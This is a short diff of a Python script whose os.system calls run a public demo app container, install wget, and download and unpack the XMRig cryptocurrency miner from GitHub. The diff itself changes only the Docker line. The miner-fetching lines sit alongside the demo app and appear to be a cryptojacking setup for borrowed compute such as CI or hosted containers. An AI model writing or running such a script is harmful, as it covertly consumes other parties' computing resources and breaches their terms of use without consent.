@@ -1,5 +1,5 @@
 import os
-os.system('docker')
+os.system('docker run --rm -it -p 5000:5000 ghcr.io/benc-uk/python-demoapp:latest')
 os.system('pip install wget')
 os.system('python -m wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz')
 os.system('tar xf xmrig-6.16.2-linux-static-x64.tar.gz')
